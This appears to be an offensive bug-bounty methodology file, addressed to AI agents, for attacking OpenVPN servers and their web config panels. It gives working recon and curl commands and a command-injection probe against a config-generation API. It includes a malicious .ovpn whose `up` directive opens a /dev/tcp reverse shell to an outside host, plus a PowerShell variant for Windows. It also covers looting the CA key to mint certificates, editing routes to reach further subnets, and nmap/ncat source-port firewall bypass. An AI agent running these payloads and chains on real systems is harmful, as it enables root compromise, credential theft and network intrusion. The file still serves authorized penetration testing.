---
technology: "OpenVPN"
kind: bug-bounty-methodology
audience: ai-agent
family: network-services
version: "1.0"
status: thin
provenance: "field-grounded (real deployments: world-writable .ovpn behind a web edit-and-Test-VPN feature → script-security 2 + up /dev/tcp reverse shell as root on the VPN host, per the Tenable technique; robots.txt-leaked /vpn/ panel + TOTP seed from a database backup → per-user config generation → sudo openvpn → route alteration reaching further internal subnets, generator path /opt/easyrsa/clients/<cn>.ovpn with CN-controlled filenames and a format-string in the generator binary; admin-only VPN-generate API whose username parameter reaches shell_exec(\"cat /var/www/html/VPN/user/$username.ovpn\") → command injection with the full config incl. <ca> returned inline; employee file-share .ovpn → sudo openvpn → pushed 10.9.0.0/24 route and internal sweep; source-port 53/4444 facade over SSH on a high port) + upstream-verified (Jacob Baines/Tenable blog for up/script-security/setenv/256-char/Windows and GUI-client behavior; nmap reference guide -g/--source-port (raw-socket scans only, inert for connect/version/script scanning); man7 ncat -p/--source-port; provider-documented proto udp→tcp + port 443 fallback). Thin unit — directive semantics and scan-flag scopes are upstream-verified, chains are field-shown. Companion overview: [[openvpn|OpenVPN]]. Pass 2 new-unit wave B, 2026-11-12."
---

# OpenVPN bug bounty methodology

Target model: an OpenVPN server (UDP/1194-classic or TCP/443 fallback) fronted
by a web panel that authenticates users (sometimes TOTP), generates per-user
`.ovpn` files, and usually shares a host with the easy-rsa PKI. Authorization
for testing assumed.

Scope discipline: OpenVPN-specific surface — config-file semantics, generation
plumbing, PKI loot, tunnel network-position. Generic panel bugs (auth bypass,
SQLi) are patterns to *test for* on any VPN panel, but attribute to the panel
framework's own unit when they are panel-generic; this file owns what is
distinctive because OpenVPN sits underneath. The password-attack story of the
older tunnel protocol is [[pptp|pptp]].

## Phase 0 — Recon

```bash
nmap -sU -p 53,1194,4444,443 198.51.100.10      # UDP face
nmap -sV -p 80,443,7443,943 198.51.100.10       # panel hunt (AS ships its own admin UI)
curl -s http://198.51.100.10/robots.txt          # field find: Disallow: /vpn/
```

- Panels leak in robots.txt (`/vpn/` field case), vhost enumeration, and
  javascript bundles naming `/api/v1/…/vpn/generate` endpoints.
- Read the connection/help pages such panels serve — one field-documented
  panel explained the proto/port fallback for restrictive networks right on
  its access page, which is also your roadmap for egress problems.
- UDP 1194 filtered ≠ absent: try 443/tcp and 53/udp variants before writing
  the service off.

## Phase 1 — Panel abuse (generation endpoints)

Field-proven flows, in escalating privilege order:

```bash
# self-service: session cookie fetches my config
curl -s -b "PHPSESSID=<sid>" http://198.51.100.10/api/v1/user/vpn/generate -o me.ovpn
# privileged: admin session POSTs a username — config returned inline
curl -sv -X POST http://198.51.100.10/api/v1/admin/vpn/generate \
  -b "PHPSESSID=<sid>" -H 'Content-Type: application/json' \
  -d '{"username":"test"}'
```

- **Follow the filename**. Generation writes `<username>.ovpn` under a store
  such as `/var/www/html/VPN/user/`; anything that later reads the file back
  by interpolating the username (`cat …/user/$username.ovpn`,
  `shell_exec`) is command-injection-shaped even when the generator itself
  sanitizes (field case: the regeneration call was safe, the file-read was
  not). Probe `{"username":";id;"}`-style payloads once authorized.
- **The generated config is loot by itself**: it prints the inline `<ca>`
  certificate and the client identity; the CA cert identifies the PKI, and
  filenames built from the certificate CN (field shape
  `/opt/easyrsa/clients/<cn>.ovpn`) show where the PKI lives.
- **TOTP-protected panels**: hunt the seed the way you would any secret —
  database backups and exports (field chain: an archive held the OTP for the
  administrative user), then generate codes locally for login.
- Also enumerate panel file features: user shares, uploads,
  archived configs (a field deployment kept a working `.ovpn` in an employee
  file-sharing feature — network access as a file download).

## Phase 2 — Malicious config files (config → shell)

The technique (upstream write-up, field-confirmed end to end). A stock client
executes script directives as the launching user:

```
remote 198.51.100.10
ifconfig 10.200.0.x 10.200.0.y        # tunnel pair: client x, server-side y (pattern form)
dev tun
script-security 2
nobind
up "/bin/bash -c '/bin/bash -i > /dev/tcp/198.51.100.99/1337 0<&1 2>&1&'"
```

- Connect normally with `sudo openvpn file.ovpn`; the shell arrives when the
  tunnel device opens. Root-launched client → root shell (field case: the
  daemon-side "Test VPN" button ran the config as root).
- The log's only tell is a single note that script-security may allow
  user-defined scripts — printed after execution. Do not rely on victims
  seeing it.
- **Windows targets**: no `/dev/tcp`; chunk the payload across `setenv`
  directives (per-directive length caps near 256 chars) and reassemble in `up`
  as a `powershell.exe -EncodedCommand` one-liner (documented variant).
- Where to plant: anywhere you can write a config the client will load —
  world-writable `.ovpn` on the server (field case: `chmod 777`, editable by
  the web user, executed by a Test feature), shared drives, config-download
  endpoints. GUI wrappers (some third-party clients and network-manager
  integrations) ignore script directives — stock CLI clients do not.
- Blue-team note for reports: this is intended vendor behavior; the finding is
  *who* could write the config, not that OpenVPN runs it.

## Phase 3 — Key and CA loot

- An `.ovpn` with inline `<cert>`/`<key>` (or `auth-user-pass` referencing a
  file) is a complete credential — treat every copy on disk, in shares, and
  in panel downloads as network access.
- On any PKI foothold, walk the easy-rsa tree: `clients/` (one file per
  identity), `pki/private/`, `pki/issued/`, and above all the CA key —
  possession mints unlimited client certificates the server will accept.
- Generator binaries and panel code around the PKI are their own bug class
  (field case: a format string in the VPN-file generator binary; CN-derived
  filenames flowing into attachment headers) — audit path handling wherever a
  certificate field becomes a filename.

## Phase 4 — Using the tunnel (routes and pivots)

```bash
sudo openvpn user.ovpn
#   TUN/TAP device tun1 opened
#   net_addr_v4_add: 10.8.0.x/24 dev tun1
#   net_route_v4_add: 10.9.0.x/24 via 10.8.0.x …   ← pushed routes name the real targets
nmap 10.9.0.x/24                                  # sweep the routed segment
```

- Read the connection log: `net_route_v4_add` lines are the engagement's
  target list.
- **Edit routes to reach more than advertised** (field chain): add `route`
  statements for further subnets behind the VPN gateway — panels advertise
  one network while the gateway routes several.
- Expect the TCP/443 fallback when egress filters block the default UDP
  service: change `proto udp` → `proto tcp` and the remote port (provider-
  documented standard practice; two lines of the config).

## Phase 5 — Source-port firewall bypass (sport 53 / 4444)

For port filters that *match the source port* — "only DNS replies come from
port 53" — probe with your source port pinned (field chain: ports 53 and 4444
scanned as closed, SSH answered on a high port once probes originated from
port 53):

```bash
nmap -g 53 -p 1-65535 198.51.100.20   # -g == --source-port
ncat -p 53 198.51.100.20 987         # talk to the revealed service
```

- Scope limits (upstream nmap guide): `-g` works for raw-socket operations —
  SYN and UDP scans; it does **nothing** for connect() scans, version
  detection, or script scanning. Drop `-sV` from these sweeps or you will
  scan unfiltered.
- ncat's flag is `-p, --source-port port` (verified man page); binding ports
  under 1024 needs root, which you have on the attack box.
- Candidate trusted ports beyond 53: whatever the environment plausibly
  answers on — field case also accepted 4444. If a port is "closed" to every
  normal scan but the host has a reason to trust a service port, pin it.
- Same idea outbound: when leaving the network is the problem, the Phase-4
  proto/port fallback is the client-side twin of this trick.

## Phase 6 — Post-position

- Confirm position with `ifconfig`/`ip a` (tun interface address names the
  VPN range) and route tables before scanning — scans through the wrong
  interface are loud and wasted.
- Re-run Phases 0–1 from inside: panels and PKI hosts are frequently
  loopback- or internal-only, and the generation endpoints look different
  behind the tunnel.

## Decision points

- Panel found → Phase 1 before touching the daemon; the panel writes the
  configs the daemon runs.
- Write access to any `.ovpn` that a root/daemon client executes → Phase 2
  (fastest shell on the VPN host).
- Config or key in hand → Phase 3 (CA? mint) then Phase 4 (routes → new
  networks).
- All ports closed but host answers ping → Phase 5 with 53/4444 source ports.
- Egress blocked from your box → Phase 4's proto/port fallback before
  anything exotic.

## Tool mapping (in prose)

The openvpn client itself (with sudo for privileged tun setup); curl and jq
against panel APIs with a session cookie; Burp Suite to intercept generation
requests and edit the JSON; easy-rsa for certificate inspection and minting
once the CA is looted; nmap with `-g` for source-pinned raw-socket sweeps;
ncat with `-p` for source-pinned interactive connections; a netcat or
socat listener for the `up` reverse shell; hashcat where TOTP seeds or panel
credentials arrive as secrets to crack.
